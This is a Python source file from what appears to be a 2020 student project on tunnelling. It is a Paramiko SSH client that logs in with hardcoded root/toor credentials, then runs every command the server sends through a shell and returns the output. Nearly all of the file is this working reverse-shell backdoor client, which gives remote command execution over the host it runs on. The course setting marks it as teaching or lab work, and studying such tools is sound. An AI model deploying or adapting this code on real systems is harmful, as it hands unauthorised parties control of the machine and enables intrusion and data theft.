# test_client.py

#==============================================================================
 #   Assignment:  Major Project - Tunelling Milestone 1
 #
 #       Author:  Alistair Godwin, Micheal Sciortino, Francesso Losi
 #     Language:  Python 3
 #                      
 #   To Compile: Paramiko must be available 
 #
 #    Class:  DPI912 
 #    Professor:  Harvey Kaduri
 #    Due Date:  Mar 24th 2020 
 #    Submitted: Mar 22nd 2020
 #
 #-----------------------------------------------------------------------------
 #
 #  Description: This program is a skeleton client that connects to an ssh server using paramiko. It awaits connections and prompts on a connection to execute shell commands onto the target client.
 #      
 #        Input:  N/A
 #
 #       Output:  Outputs to console results of command executed
 #
 #    Algorithm:  Invokes the Paramiko supplied functions to create and manage a connection to an SSH server. Continously request new commands and then send them to the target client. Await for 
 #               
 #             
 #   Required Features Not Included: N/A
 #
 #   Known Bugs:  N/A 
 #      
 #
 #   Classification: N/A
 #
#==============================================================================
import paramiko
import threading
import subprocess
import sys
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect('::1',port=9000, username='root', password='toor')
chan = client.get_transport().open_session()
chan.send('Hello? Yes this is client calling via SSH!')
print(chan.recv(1024))

while True:
    command = chan.recv(1024)
    command = command.decode()
    print("Executing this -->" + str(command))
    result = str(command)
    try:
        # safe escape in case the server leaves us 
        if (result == 'stop' or result == ''):
            client.close()
            sys.exit(0)
        #exec this command, in future this would be os.system()
        proc = subprocess.check_output(command, shell=True)
        chan.send(proc)
    except Exception as e:
        print("An Error or interuption occurred. Continue As normal")
        chan.send('An Error or interuption occurred. Continue As normal')


client.close()
